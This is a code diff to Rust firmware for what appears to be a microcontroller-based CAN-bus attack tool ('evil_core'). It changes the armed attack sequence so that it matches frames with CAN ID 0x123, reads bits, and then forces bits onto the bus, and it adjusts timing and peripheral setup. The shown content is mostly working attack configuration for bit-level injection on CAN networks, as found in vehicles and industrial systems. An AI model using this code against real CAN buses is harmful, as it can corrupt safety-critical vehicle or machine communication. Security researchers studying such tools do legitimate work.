@@ -5,15 +5,8 @@ mod bluepill;
 mod soft_timer;
 mod spi;
 mod spi_device;
-use soft_timer::SoftTimer;
 use evil_core::{
-    AttackCmd,
-    BitStream,
-    CanBitrates,
-    EvilBsp,
-    EvilCore,
-    clock::TicksClock,
-    tranceiver::Tranceiver
+    clock::TicksClock, tranceiver::Tranceiver, AttackCmd, BitStream, CanBitrates, EvilBsp, EvilCore, FastBitQueue
 };
 
 use {defmt_rtt as _, panic_probe as _};
@@ -137,10 +130,10 @@ async fn main(spawner: Spawner) {
 
 
     // Delay for the MCP2515
-    let delay = SoftTimer {};
+    // let delay = SoftTimer {};
 
     // Setup SPI
-    let spi = create_default_spi!(p);
+    // let spi = create_default_spi!(p);
 
     let cp = cortex_m::Peripherals::take().unwrap();
     let systick = SystickClock::new(cp.SYST);
@@ -151,7 +144,7 @@ async fn main(spawner: Spawner) {
     info!("BSP created");
 
     // Create and run the Doggie core
-    let mut core = EvilCore::new(bsp, CanBitrates::Kbps250, 950);
+    let mut core = EvilCore::new(bsp, CanBitrates::Kbps250, 1400);
 
     info!("Core created");
 
@@ -164,29 +157,29 @@ async fn main(spawner: Spawner) {
         core.arm(
             &[
 
+                AttackCmd::Wait { bits: 1 },
+                AttackCmd::Match { stream: FastBitQueue::new(0x123, 11) },
+                AttackCmd::Wait { bits: 3 },
+                AttackCmd::Read { len: 4 },
+                AttackCmd::WaitBuffered,
+                AttackCmd::Wait { bits: 16 },
+                AttackCmd::Force { stream: FastBitQueue::new(0x1, 1) },
+
+
+
                 // AttackCmd::Wait { bits: 1 },
                 // AttackCmd::Match { stream: BitStream::from_u32(0x123, 11) },
-                // AttackCmd::Wait { bits: 3 },
-                // AttackCmd::Read { len: 4 },
-                // AttackCmd::WaitBuffered,
-                // AttackCmd::Wait { bits: 42 },
+                // AttackCmd::Wait { bits: 39 },
                 // AttackCmd::Send { stream: BitStream::from_u32(0xFFF, 12) },
 
-
-
-                AttackCmd::Wait { bits: 1 },
-                AttackCmd::Match { stream: BitStream::from_u32(0x123, 11) },
-                AttackCmd::Wait { bits: 42 },
-                AttackCmd::Send { stream: BitStream::from_u32(0xFFF, 12) },
-
-                // AttackCmd::Wait { bits: 46 + 8 },
+                // AttackCmd::Wait { bits: 10 },
                 // AttackCmd::Wait { bits: 9 },
                 // AttackCmd::Send { stream: BitStream::from_u32(0xFFF, 12) },
-                // AttackCmd::Force { stream: BitStream::from_u32(0xFFF, 12) },
+                // AttackCmd::Force { stream: BitStream::from_u32(0b10101010101, 11) },
             ]
         ).unwrap();
 
-        Timer::after_millis(100).await;
+        Timer::after_millis(800).await;
 
         info!("Attack armed");
 
